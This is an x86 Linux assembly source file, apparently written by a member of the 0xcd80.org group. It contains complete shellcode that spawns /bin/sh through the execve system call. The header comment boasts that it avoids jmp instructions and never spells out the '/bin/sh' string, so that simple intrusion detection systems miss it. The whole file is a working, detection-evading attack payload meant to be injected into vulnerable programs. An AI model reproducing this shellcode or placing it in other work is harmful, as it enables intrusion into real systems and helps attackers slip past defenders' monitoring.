/* nirosys@0xcd80.org
 * * * * * * * * * * * * *
 * Traditional execve("/bin/sh",{"/bin/sh",NULL},NULL);
 * * * * * *
 * Has it been done before? Yes.
 * Why do it again? Cause *I* didn't do it the other times.
 * What makes it so special?
 *     No jmp. That's about it..
 *     And, no "/bin/sh" string..
 *      for simplistic IDS.
 * * * * * * * * * * * * */
.data
.NAME:
	.string "0xcd80.org CD80-lnx-sh.s"

.text
.globl _start

_start:
	movl	$0x2368732f, %eax /* "/sh#"  0x2f736823 */
	andl	$0xDC68732f, %eax /* ="/sh\0" 0x2f736800 */
	pushl	%eax
	pushl	$0x6e69622f  /* "/bin"  0x2f62696e*/
	movl	%esp, %ebx   /* Save the address of "/bin/sh" */
	xorl	%eax, %eax   /* Create our needed NULL */
	pushl	%eax	     /* NULL argument */
	pushl	%ebx	     /* command  (Param 1) */
	movl	%esp, %ecx   /* Save %esp for params[] */
	addb	$0xb, %al    /* SYS_execve */
	xorl	%edx, %edx   /* NULL Environment */
	int	$0x80        /* 0xCD80 w00t!! */
